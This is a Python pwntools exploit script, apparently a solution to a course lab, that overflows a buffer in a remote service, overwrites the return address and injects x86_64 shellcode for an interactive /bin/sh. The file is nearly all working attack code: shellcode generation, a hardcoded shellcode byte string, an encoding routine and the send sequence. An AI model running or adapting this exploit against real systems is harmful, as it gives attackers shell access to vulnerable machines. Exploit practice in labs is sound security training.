from pwn import *

context.arch = "x86_64"                            # Set the architecture to x86_64

''' Define Constants '''
OP_LOC = 4199382                           # Opcode Address
BUFFER_SIZE = 8             # Set buffer size
SHELLCODE = asm(shellcraft.amd64.linux.sh())    # Generate shellcode
#SHELLCODE = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

BLANK = b"0"                                # 0: filler
EXIT = b"-1 "                               # -1: console exit key

def input_conversion(shell_raw):
    block_size = 8
    block_reversed_list = []

    # Convert bytes to a string
    shell_str = shell_raw.decode('unicode_escape')

    # CONVERT TO 16
    for i in range(0, len(shell_str), block_size):
        block = shell_str[i:i + block_size]
        block_reversed = block[::-1]
        block_reversed_hex = block_reversed.encode('latin-1').hex()

        # Add leading zeros if the length is less than 16
        if len(block_reversed_hex) < 16:
            block_reversed_hex = '0' * (16 - len(block_reversed_hex)) + block_reversed_hex

        block_reversed_list.append(block_reversed_hex)

    # SPLIT TO 8 and order
    block_split_list = []

    #Split 8 byte block into 4 byte blocks, swap and save
    for each_half in block_reversed_list:
        half1 = each_half[:len(each_half) // 2]
        half2 = each_half[len(each_half) // 2:]
        block_split_list.extend([half2, half1])         #switch bytes and save

    # convert to decimal
    shell_decimal = []

    for each_item in block_split_list:
        decimal_value = int(each_item, 16)              #convert to decimal
        shell_decimal.append(decimal_value)       #append to list

    return shell_decimal


if __name__ == '__main__':
    ''' Establish Connection '''
    p = remote("csc748.hostbin.org", 7023)          # Test Script Against Server
    # p = process("./2-3_lab.bin")                  # Uncomment to Test Script Locally
    # p = gdb.debug("./2-3_lab.bin")                # Uncomment to debug GDB

    ''' Initialize Variables '''
    # Define Buffer Filler Values
    buff_filler = [2863311530, 3149642683]          #0xaaaaaa and 0xbbbbbbbb in decimal

    shell_converted = input_conversion(SHELLCODE)
    print(shell_converted)

    ''' Exploit Vulnerability '''
    # Exploit Format:
    #   (<buffer fill>*136 + <opcode> + <shellcode> + b"\n")
    # #

    # Send Buffer Fill
    for x in range(BUFFER_SIZE - 1):
        for each in buff_filler:
            p.sendline(str(each).encode())  # Send the input value twice

    # Send Opcode
    p.sendline(str(OP_LOC).encode())  # Send the opcode location as bytes
    p.sendline(BLANK)

    # Send Shellcode
    for each_value in shell_converted:
        p.sendline(str(each_value).encode())

    p.sendline(EXIT)  # Send exit code

    p.interactive()


